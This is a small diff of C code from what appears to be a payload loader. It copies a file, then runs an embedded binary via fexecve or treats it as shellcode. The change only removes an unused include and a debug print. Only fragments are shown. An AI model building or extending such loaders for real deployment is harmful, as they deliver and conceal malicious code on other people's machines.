@@ -60,8 +60,6 @@ void	duplicate(char *path, char *target)
 	extern void		*_binary___payload_size;
 #endif
 
-#include <errno.h>
-
 int		main(void)
 {
 	char path[MAX_PATH_SIZE];
@@ -105,7 +103,6 @@ int		main(void)
 
 			fexecve(fd, argv, envv);
 			close(fd);
-			printf("end\n");
 		}
 		else // Assume it's a shellcode
 		{
